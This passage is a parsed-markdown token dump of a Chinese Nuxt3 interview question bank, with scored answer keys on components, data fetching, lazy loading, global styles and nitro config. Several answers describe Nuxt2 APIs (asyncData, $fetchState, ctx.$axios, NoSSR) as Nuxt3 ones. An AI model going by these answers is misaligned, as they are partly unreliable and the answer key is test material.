分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"* **1：** `<NuxtPage>`类似于 Nuxt2 中的Nuxt组件，是 Nuxt3 里用于渲染当前路由对应的页面组件的核心组件、\\n* `<NuxtLink>`用于在 Nuxt 应用内部进行页面导航；\\n* `<ClientOnly>`只在客户端被渲染和执行；\\n* `<Transition>`用于给页面或组件的切换添加过渡动画效果；\\n* `<KeepAlive>`保留组件的状态，让它在切换后依然保持之前的状态；\\n* `<Suspense>`在 Nuxt3 中用于处理异步组件的加载状态，特别是当组件需要等待一些异步操作（如异步获取数据、加载外部脚本等）完成后才能正确渲染时，Suspense 可以显示一个\\n占位内容（如加载提示信息），直到异步操作结束，组件成功渲染，从而提供更好的用户体验，避免页面出现长时间空白等情况；\\n\\n* **1：** `<NuxtLayout>`用于指定页面所使用的布局。在 Nuxt3 中，可以创建多个不同的布局文件（.vue格式，定义了不同的页面结构样式），然后通过NuxtLayout组件来选\\n择具体使用哪一个布局来呈现页面。这为实现多样化的页面布局设计提供了便利，满足不同页面在结构、样式等方面的差异化需求;\\n* `<NoSSR>`用来处理不适合在服务端渲染的内容；\\n* `<slot>`用于实现内容分发机制。父组件可以向子组件传递内容，子组件通过slot来接收并展示这些内容；\\n* `<NuxtImg>`；\\n* `<NuxtPicture>`。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* **1：** `<NuxtPage>`类似于 Nuxt2 中的Nuxt组件，是 Nuxt3 里用于渲染当前路由对应的页面组件的核心组件、\\n","task":false,"loose":true,"text":"**1：** `<NuxtPage>`类似于 Nuxt2 中的Nuxt组件，是 Nuxt3 里用于渲染当前路由对应的页面组件的核心组件、","tokens":[{"type":"text","raw":"**1：** `<NuxtPage>`类似于 Nuxt2 中的Nuxt组件，是 Nuxt3 里用于渲染当前路由对应的页面组件的核心组件、","text":"**1：** `<NuxtPage>`类似于 Nuxt2 中的Nuxt组件，是 Nuxt3 里用于渲染当前路由对应的页面组件的核心组件、","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" ","text":" ","escaped":false},{"type":"codespan","raw":"`<NuxtPage>`","text":"<NuxtPage>"},{"type":"text","raw":"类似于 Nuxt2 中的Nuxt组件，是 Nuxt3 里用于渲染当前路由对应的页面组件的核心组件、","text":"类似于 Nuxt2 中的Nuxt组件，是 Nuxt3 里用于渲染当前路由对应的页面组件的核心组件、","escaped":false}]}]},{"type":"list_item","raw":"* `<NuxtLink>`用于在 Nuxt 应用内部进行页面导航；\\n","task":false,"loose":true,"text":"`<NuxtLink>`用于在 Nuxt 应用内部进行页面导航；","tokens":[{"type":"text","raw":"`<NuxtLink>`用于在 Nuxt 应用内部进行页面导航；","text":"`<NuxtLink>`用于在 Nuxt 应用内部进行页面导航；","tokens":[{"type":"codespan","raw":"`<NuxtLink>`","text":"<NuxtLink>"},{"type":"text","raw":"用于在 Nuxt 应用内部进行页面导航；","text":"用于在 Nuxt 应用内部进行页面导航；","escaped":false}]}]},{"type":"list_item","raw":"* `<ClientOnly>`只在客户端被渲染和执行；\\n","task":false,"loose":true,"text":"`<ClientOnly>`只在客户端被渲染和执行；","tokens":[{"type":"text","raw":"`<ClientOnly>`只在客户端被渲染和执行；","text":"`<ClientOnly>`只在客户端被渲染和执行；","tokens":[{"type":"codespan","raw":"`<ClientOnly>`","text":"<ClientOnly>"},{"type":"text","raw":"只在客户端被渲染和执行；","text":"只在客户端被渲染和执行；","escaped":false}]}]},{"type":"list_item","raw":"* `<Transition>`用于给页面或组件的切换添加过渡动画效果；\\n","task":false,"loose":true,"text":"`<Transition>`用于给页面或组件的切换添加过渡动画效果；","tokens":[{"type":"text","raw":"`<Transition>`用于给页面或组件的切换添加过渡动画效果；","text":"`<Transition>`用于给页面或组件的切换添加过渡动画效果；","tokens":[{"type":"codespan","raw":"`<Transition>`","text":"<Transition>"},{"type":"text","raw":"用于给页面或组件的切换添加过渡动画效果；","text":"用于给页面或组件的切换添加过渡动画效果；","escaped":false}]}]},{"type":"list_item","raw":"* `<KeepAlive>`保留组件的状态，让它在切换后依然保持之前的状态；\\n","task":false,"loose":true,"text":"`<KeepAlive>`保留组件的状态，让它在切换后依然保持之前的状态；","tokens":[{"type":"text","raw":"`<KeepAlive>`保留组件的状态，让它在切换后依然保持之前的状态；","text":"`<KeepAlive>`保留组件的状态，让它在切换后依然保持之前的状态；","tokens":[{"type":"codespan","raw":"`<KeepAlive>`","text":"<KeepAlive>"},{"type":"text","raw":"保留组件的状态，让它在切换后依然保持之前的状态；","text":"保留组件的状态，让它在切换后依然保持之前的状态；","escaped":false}]}]},{"type":"list_item","raw":"* `<Suspense>`在 Nuxt3 中用于处理异步组件的加载状态，特别是当组件需要等待一些异步操作（如异步获取数据、加载外部脚本等）完成后才能正确渲染时，Suspense 可以显示一个\\n占位内容（如加载提示信息），直到异步操作结束，组件成功渲染，从而提供更好的用户体验，避免页面出现长时间空白等情况；\\n\\n","task":false,"loose":true,"text":"`<Suspense>`在 Nuxt3 中用于处理异步组件的加载状态，特别是当组件需要等待一些异步操作（如异步获取数据、加载外部脚本等）完成后才能正确渲染时，Suspense 可以显示一个\\n占位内容（如加载提示信息），直到异步操作结束，组件成功渲染，从而提供更好的用户体验，避免页面出现长时间空白等情况；\\n","tokens":[{"type":"text","raw":"`<Suspense>`在 Nuxt3 中用于处理异步组件的加载状态，特别是当组件需要等待一些异步操作（如异步获取数据、加载外部脚本等）完成后才能正确渲染时，Suspense 可以显示一个\\n\\n占位内容（如加载提示信息），直到异步操作结束，组件成功渲染，从而提供更好的用户体验，避免页面出现长时间空白等情况；\\n","text":"`<Suspense>`在 Nuxt3 中用于处理异步组件的加载状态，特别是当组件需要等待一些异步操作（如异步获取数据、加载外部脚本等）完成后才能正确渲染时，Suspense 可以显示一个\\n占位内容（如加载提示信息），直到异步操作结束，组件成功渲染，从而提供更好的用户体验，避免页面出现长时间空白等情况；","tokens":[{"type":"codespan","raw":"`<Suspense>`","text":"<Suspense>"},{"type":"text","raw":"在 Nuxt3 中用于处理异步组件的加载状态，特别是当组件需要等待一些异步操作（如异步获取数据、加载外部脚本等）完成后才能正确渲染时，Suspense 可以显示一个\\n占位内容（如加载提示信息），直到异步操作结束，组件成功渲染，从而提供更好的用户体验，避免页面出现长时间空白等情况；","text":"在 Nuxt3 中用于处理异步组件的加载状态，特别是当组件需要等待一些异步操作（如异步获取数据、加载外部脚本等）完成后才能正确渲染时，Suspense 可以显示一个\\n占位内容（如加载提示信息），直到异步操作结束，组件成功渲染，从而提供更好的用户体验，避免页面出现长时间空白等情况；","escaped":false}]}]},{"type":"list_item","raw":"* **1：** `<NuxtLayout>`用于指定页面所使用的布局。在 Nuxt3 中，可以创建多个不同的布局文件（.vue格式，定义了不同的页面结构样式），然后通过NuxtLayout组件来选\\n择具体使用哪一个布局来呈现页面。这为实现多样化的页面布局设计提供了便利，满足不同页面在结构、样式等方面的差异化需求;\\n","task":false,"loose":true,"text":"**1：** `<NuxtLayout>`用于指定页面所使用的布局。在 Nuxt3 中，可以创建多个不同的布局文件（.vue格式，定义了不同的页面结构样式），然后通过NuxtLayout组件来选\\n择具体使用哪一个布局来呈现页面。这为实现多样化的页面布局设计提供了便利，满足不同页面在结构、样式等方面的差异化需求;","tokens":[{"type":"text","raw":"**1：** `<NuxtLayout>`用于指定页面所使用的布局。在 Nuxt3 中，可以创建多个不同的布局文件（.vue格式，定义了不同的页面结构样式），然后通过NuxtLayout组件来选\\n\\n择具体使用哪一个布局来呈现页面。这为实现多样化的页面布局设计提供了便利，满足不同页面在结构、样式等方面的差异化需求;","text":"**1：** `<NuxtLayout>`用于指定页面所使用的布局。在 Nuxt3 中，可以创建多个不同的布局文件（.vue格式，定义了不同的页面结构样式），然后通过NuxtLayout组件来选\\n择具体使用哪一个布局来呈现页面。这为实现多样化的页面布局设计提供了便利，满足不同页面在结构、样式等方面的差异化需求;","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" ","text":" ","escaped":false},{"type":"codespan","raw":"`<NuxtLayout>`","text":"<NuxtLayout>"},{"type":"text","raw":"用于指定页面所使用的布局。在 Nuxt3 中，可以创建多个不同的布局文件（.vue格式，定义了不同的页面结构样式），然后通过NuxtLayout组件来选\\n择具体使用哪一个布局来呈现页面。这为实现多样化的页面布局设计提供了便利，满足不同页面在结构、样式等方面的差异化需求;","text":"用于指定页面所使用的布局。在 Nuxt3 中，可以创建多个不同的布局文件（.vue格式，定义了不同的页面结构样式），然后通过NuxtLayout组件来选\\n择具体使用哪一个布局来呈现页面。这为实现多样化的页面布局设计提供了便利，满足不同页面在结构、样式等方面的差异化需求;","escaped":false}]}]},{"type":"list_item","raw":"* `<NoSSR>`用来处理不适合在服务端渲染的内容；\\n","task":false,"loose":true,"text":"`<NoSSR>`用来处理不适合在服务端渲染的内容；","tokens":[{"type":"text","raw":"`<NoSSR>`用来处理不适合在服务端渲染的内容；","text":"`<NoSSR>`用来处理不适合在服务端渲染的内容；","tokens":[{"type":"codespan","raw":"`<NoSSR>`","text":"<NoSSR>"},{"type":"text","raw":"用来处理不适合在服务端渲染的内容；","text":"用来处理不适合在服务端渲染的内容；","escaped":false}]}]},{"type":"list_item","raw":"* `<slot>`用于实现内容分发机制。父组件可以向子组件传递内容，子组件通过slot来接收并展示这些内容；\\n","task":false,"loose":true,"text":"`<slot>`用于实现内容分发机制。父组件可以向子组件传递内容，子组件通过slot来接收并展示这些内容；","tokens":[{"type":"text","raw":"`<slot>`用于实现内容分发机制。父组件可以向子组件传递内容，子组件通过slot来接收并展示这些内容；","text":"`<slot>`用于实现内容分发机制。父组件可以向子组件传递内容，子组件通过slot来接收并展示这些内容；","tokens":[{"type":"codespan","raw":"`<slot>`","text":"<slot>"},{"type":"text","raw":"用于实现内容分发机制。父组件可以向子组件传递内容，子组件通过slot来接收并展示这些内容；","text":"用于实现内容分发机制。父组件可以向子组件传递内容，子组件通过slot来接收并展示这些内容；","escaped":false}]}]},{"type":"list_item","raw":"* `<NuxtImg>`；\\n","task":false,"loose":true,"text":"`<NuxtImg>`；","tokens":[{"type":"text","raw":"`<NuxtImg>`；","text":"`<NuxtImg>`；","tokens":[{"type":"codespan","raw":"`<NuxtImg>`","text":"<NuxtImg>"},{"type":"text","raw":"；","text":"；","escaped":false}]}]},{"type":"list_item","raw":"* `<NuxtPicture>`。","task":false,"loose":true,"text":"`<NuxtPicture>`。","tokens":[{"type":"text","raw":"`<NuxtPicture>`。","text":"`<NuxtPicture>`。","tokens":[{"type":"codespan","raw":"`<NuxtPicture>`","text":"<NuxtPicture>"},{"type":"text","raw":"。","text":"。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 在 Nuxt3 中，怎样在服务端获取数据并传递给页面组件？\\n\\n","depth":2,"text":"在 Nuxt3 中，怎样在服务端获取数据并传递给页面组件？","tokens":[{"type":"text","raw":"在 Nuxt3 中，怎样在服务端获取数据并传递给页面组件？","text":"在 Nuxt3 中，怎样在服务端获取数据并传递给页面组件？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"* **1：** 可以使用 asyncData 或 fetch 方法。在页面组件中，asyncData 是一个异步函数，接收上下文 ctx，在其中获取数据后返回一个对象，该对象会与组件的\\n data 合并；fetch 方法类似，但数据存储在组件实例的 $fetchState 中，例如在 asyncData 中：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** 可以使用 asyncData 或 fetch 方法。在页面组件中，asyncData 是一个异步函数，接收上下文 ctx，在其中获取数据后返回一个对象，该对象会与组件的\\n data 合并；fetch 方法类似，但数据存储在组件实例的 $fetchState 中，例如在 asyncData 中：","task":false,"loose":false,"text":"**1：** 可以使用 asyncData 或 fetch 方法。在页面组件中，asyncData 是一个异步函数，接收上下文 ctx，在其中获取数据后返回一个对象，该对象会与组件的\\n data 合并；fetch 方法类似，但数据存储在组件实例的 $fetchState 中，例如在 asyncData 中：","tokens":[{"type":"text","raw":"**1：** 可以使用 asyncData 或 fetch 方法。在页面组件中，asyncData 是一个异步函数，接收上下文 ctx，在其中获取数据后返回一个对象，该对象会与组件的\\n\\n data 合并；fetch 方法类似，但数据存储在组件实例的 $fetchState 中，例如在 asyncData 中：","text":"**1：** 可以使用 asyncData 或 fetch 方法。在页面组件中，asyncData 是一个异步函数，接收上下文 ctx，在其中获取数据后返回一个对象，该对象会与组件的\\n data 合并；fetch 方法类似，但数据存储在组件实例的 $fetchState 中，例如在 asyncData 中：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 可以使用 asyncData 或 fetch 方法。在页面组件中，asyncData 是一个异步函数，接收上下文 ctx，在其中获取数据后返回一个对象，该对象会与组件的\\n data 合并；fetch 方法类似，但数据存储在组件实例的 $fetchState 中，例如在 asyncData 中：","text":" 可以使用 asyncData 或 fetch 方法。在页面组件中，asyncData 是一个异步函数，接收上下文 ctx，在其中获取数据后返回一个对象，该对象会与组件的\\n data 合并；fetch 方法类似，但数据存储在组件实例的 $fetchState 中，例如在 asyncData 中：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":" ```js\\n export default { \\n  async asyncData(ctx) { \\n    const data = await ctx.$axios.get(\'/api/data\'); \\n    return { \\n      fetchedData: data \\n    }; \\n  } \\n}\\n ```","lang":"js","text":"export default { \\n async asyncData(ctx) { \\n   const data = await ctx.$axios.get(\'/api/data\'); \\n   return { \\n     fetchedData: data \\n   }; \\n } \\n}"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## Nuxt3 的路由懒加载是如何实现的？\\n\\n","depth":2,"text":"Nuxt3 的路由懒加载是如何实现的？","tokens":[{"type":"text","raw":"Nuxt3 的路由懒加载是如何实现的？","text":"Nuxt3 的路由懒加载是如何实现的？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"* **1：** Nuxt3 基于 Vue Router 的懒加载功能，通过动态导入组件实现路由懒加载。\\n* **1：** 在定义路由时，使用箭头函数返回 `import()` 导入的组件，例如 `{ path: \'/about\', component: () => import(\'~/pages/About.vue\') }`，这样在访问路\\n由时才会加载对应的组件代码，提高初始加载性能。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** Nuxt3 基于 Vue Router 的懒加载功能，通过动态导入组件实现路由懒加载。\\n","task":false,"loose":false,"text":"**1：** Nuxt3 基于 Vue Router 的懒加载功能，通过动态导入组件实现路由懒加载。","tokens":[{"type":"text","raw":"**1：** Nuxt3 基于 Vue Router 的懒加载功能，通过动态导入组件实现路由懒加载。","text":"**1：** Nuxt3 基于 Vue Router 的懒加载功能，通过动态导入组件实现路由懒加载。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Nuxt3 基于 Vue Router 的懒加载功能，通过动态导入组件实现路由懒加载。","text":" Nuxt3 基于 Vue Router 的懒加载功能，通过动态导入组件实现路由懒加载。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 在定义路由时，使用箭头函数返回 `import()` 导入的组件，例如 `{ path: \'/about\', component: () => import(\'~/pages/About.vue\') }`，这样在访问路\\n由时才会加载对应的组件代码，提高初始加载性能。","task":false,"loose":false,"text":"**1：** 在定义路由时，使用箭头函数返回 `import()` 导入的组件，例如 `{ path: \'/about\', component: () => import(\'~/pages/About.vue\') }`，这样在访问路\\n由时才会加载对应的组件代码，提高初始加载性能。","tokens":[{"type":"text","raw":"**1：** 在定义路由时，使用箭头函数返回 `import()` 导入的组件，例如 `{ path: \'/about\', component: () => import(\'~/pages/About.vue\') }`，这样在访问路\\n\\n由时才会加载对应的组件代码，提高初始加载性能。","text":"**1：** 在定义路由时，使用箭头函数返回 `import()` 导入的组件，例如 `{ path: \'/about\', component: () => import(\'~/pages/About.vue\') }`，这样在访问路\\n由时才会加载对应的组件代码，提高初始加载性能。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 在定义路由时，使用箭头函数返回 ","text":" 在定义路由时，使用箭头函数返回 ","escaped":false},{"type":"codespan","raw":"`import()`","text":"import()"},{"type":"text","raw":" 导入的组件，例如 ","text":" 导入的组件，例如 ","escaped":false},{"type":"codespan","raw":"`{ path: \'/about\', component: () => import(\'~/pages/About.vue\') }`","text":"{ path: \'/about\', component: () => import(\'~/pages/About.vue\') }"},{"type":"text","raw":"，这样在访问路\\n由时才会加载对应的组件代码，提高初始加载性能。","text":"，这样在访问路\\n由时才会加载对应的组件代码，提高初始加载性能。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## Nuxt3 中如何定义全局样式？\\n\\n","depth":2,"text":"Nuxt3 中如何定义全局样式？","tokens":[{"type":"text","raw":"Nuxt3 中如何定义全局样式？","text":"Nuxt3 中如何定义全局样式？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"* **1：** 在 nuxt.config.ts 中通过 css 数组添加全局样式文件路径,如： `[\'~/assets/css/global.css\']`, 使样式在整个应用中生效。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** 在 nuxt.config.ts 中通过 css 数组添加全局样式文件路径,如： `[\'~/assets/css/global.css\']`, 使样式在整个应用中生效。","task":false,"loose":false,"text":"**1：** 在 nuxt.config.ts 中通过 css 数组添加全局样式文件路径,如： `[\'~/assets/css/global.css\']`, 使样式在整个应用中生效。","tokens":[{"type":"text","raw":"**1：** 在 nuxt.config.ts 中通过 css 数组添加全局样式文件路径,如： `[\'~/assets/css/global.css\']`, 使样式在整个应用中生效。","text":"**1：** 在 nuxt.config.ts 中通过 css 数组添加全局样式文件路径,如： `[\'~/assets/css/global.css\']`, 使样式在整个应用中生效。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 在 nuxt.config.ts 中通过 css 数组添加全局样式文件路径,如： ","text":" 在 nuxt.config.ts 中通过 css 数组添加全局样式文件路径,如： ","escaped":false},{"type":"codespan","raw":"`[\'~/assets/css/global.css\']`","text":"[\'~/assets/css/global.css\']"},{"type":"text","raw":", 使样式在整个应用中生效。","text":", 使样式在整个应用中生效。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 请解释 Nuxt3 中 nitro 的作用及关键配置项\\n\\n","depth":2,"text":"请解释 Nuxt3 中 nitro 的作用及关键配置项","tokens":[{"type":"text","raw":"请解释 Nuxt3 中 nitro 的作用及关键配置项","text":"请解释 Nuxt3 中 nitro 的作用及关键配置项","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（8 分）\\n\\n","depth":4,"text":"解答（8 分）","tokens":[{"type":"text","raw":"解答（8 分）","text":"解答（8 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"* **2：** nitro 负责 Nuxt3 服务器端构建与部署核心支撑、服务端渲染（SSR）及性能优化、灵活的路由处理与适配、跨平台与多环境适配\\n* **1：** 指定服务器的预设模式，决定了 Nuxt3 应用最终如何构建以及适配何种类型的运行环境。例：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **2：** nitro 负责 Nuxt3 服务器端构建与部署核心支撑、服务端渲染（SSR）及性能优化、灵活的路由处理与适配、跨平台与多环境适配\\n","task":false,"loose":false,"text":"**2：** nitro 负责 Nuxt3 服务器端构建与部署核心支撑、服务端渲染（SSR）及性能优化、灵活的路由处理与适配、跨平台与多环境适配","tokens":[{"type":"text","raw":"**2：** nitro 负责 Nuxt3 服务器端构建与部署核心支撑、服务端渲染（SSR）及性能优化、灵活的路由处理与适配、跨平台与多环境适配","text":"**2：** nitro 负责 Nuxt3 服务器端构建与部署核心支撑、服务端渲染（SSR）及性能优化、灵活的路由处理与适配、跨平台与多环境适配","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" nitro 负责 Nuxt3 服务器端构建与部署核心支撑、服务端渲染（SSR）及性能优化、灵活的路由处理与适配、跨平台与多环境适配","text":" nitro 负责 Nuxt3 服务器端构建与部署核心支撑、服务端渲染（SSR）及性能优化、灵活的路由处理与适配、跨平台与多环境适配","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 指定服务器的预设模式，决定了 Nuxt3 应用最终如何构建以及适配何种类型的运行环境。例：","task":false,"loose":false,"text":"**1：** 指定服务器的预设模式，决定了 Nuxt3 应用最终如何构建以及适配何种类型的运行环境。例：","tokens":[{"type":"text","raw":"**1：** 指定服务器的预设模式，决定了 Nuxt3 应用最终如何构建以及适配何种类型的运行环境。例：","text":"**1：** 指定服务器的预设模式，决定了 Nuxt3 应用最终如何构建以及适配何种类型的运行环境。例：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 指定服务器的预设模式，决定了 Nuxt3 应用最终如何构建以及适配何种类型的运行环境。例：","text":" 指定服务器的预设模式，决定了 Nuxt3 应用最终如何构建以及适配何种类型的运行环境。例：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n// nuxt.config.ts\\nexport default {\\n  nitro: {\\n    preset: \'node-server\'\\n  }\\n}\\n//在上述配置中，选择 node-server 预设，表示应用将以适合在传统 Node.js 服务器上运行的方式进行构建，生成对应的可执行代码和相关配置。如果设置为 serverless，\\n// 例如 preset: \'serverless\'，则会按照无服务器架构的要求对应用进行构建，以便能够部署到像 AWS Lambda 这样的无服务器环境中，nitro 会自动处理相关的代码打包、资源管理等差异，确保应用正常运行。\\n```","lang":"js","text":"// nuxt.config.ts\\nexport default {\\n  nitro: {\\n    preset: \'node-server\'\\n  }\\n}\\n//在上述配置中，选择 node-server 预设，表示应用将以适合在传统 Node.js 服务器上运行的方式进行构建，生成对应的可执行代码和相关配置。如果设置为 serverless，\\n// 例如 preset: \'serverless\'，则会按照无服务器架构的要求对应用进行构建，以便能够部署到像 AWS Lambda 这样的无服务器环境中，nitro 会自动处理相关的代码打包、资源管理等差异，确保应用正常运行。"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"* **2：** routeRules,用于详细定义各个路由的规则，涵盖缓存策略、重定向规则、响应头设置等方面，能够根据具体的业务需求对不同路由进行定制化配置，优化路由相关的性能和用户访问逻辑。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **2：** routeRules,用于详细定义各个路由的规则，涵盖缓存策略、重定向规则、响应头设置等方面，能够根据具体的业务需求对不同路由进行定制化配置，优化路由相关的性能和用户访问逻辑。","task":false,"loose":false,"text":"**2：** routeRules,用于详细定义各个路由的规则，涵盖缓存策略、重定向规则、响应头设置等方面，能够根据具体的业务需求对不同路由进行定制化配置，优化路由相关的性能和用户访问逻辑。","tokens":[{"type":"text","raw":"**2：** routeRules,用于详细定义各个路由的规则，涵盖缓存策略、重定向规则、响应头设置等方面，能够根据具体的业务需求对不同路由进行定制化配置，优化路由相关的性能和用户访问逻辑。","text":"**2：** routeRules,用于详细定义各个路由的规则，涵盖缓存策略、重定向规则、响应头设置等方面，能够根据具体的业务需求对不同路由进行定制化配置，优化路由相关的性能和用户访问逻辑。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" routeRules,用于详细定义各个路由的规则，涵盖缓存策略、重定向规则、响应头设置等方面，能够根据具体的业务需求对不同路由进行定制化配置，优化路由相关的性能和用户访问逻辑。","text":" routeRules,用于详细定义各个路由的规则，涵盖缓存策略、重定向规则、响应头设置等方面，能够根据具体的业务需求对不同路由进行定制化配置，优化路由相关的性能和用户访问逻辑。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```ts\\n// nuxt.config.ts\\nexport default {\\n  nitro: {\\n    routeRules: {\\n      \'/\': {\\n        cache: {\\n          maxAge: 60 * 10 // 为首页设置缓存时间，这里是 10 分钟\\n        }\\n      },\\n      \'/about\': {\\n        redirect: {\\n          destination: \'/\', // 将访问 /about 页面重定向到首页\\n          statusCode: 302\\n        }\\n      },\\n      \'/api/data\': {\\n        headers: {\\n          \'Access-Control-Allow-Origin\': \'*\' // 为 /api/data 路由设置响应头，允许跨域访问\\n        }\\n      }\\n    }\\n  }\\n}\\n//在这个示例中，针对应用的根路由（/）设置了缓存策略，即用户首次访问后，在接下来的 10 分钟内再次访问该页面时，服务器可以直接从缓存中获取页面内容并返回，减\\n// 少服务器处理负担；对于 /about 页面配置了重定向规则，当用户访问该页面时会以 302 状态码重定向到首页；而 /api/data 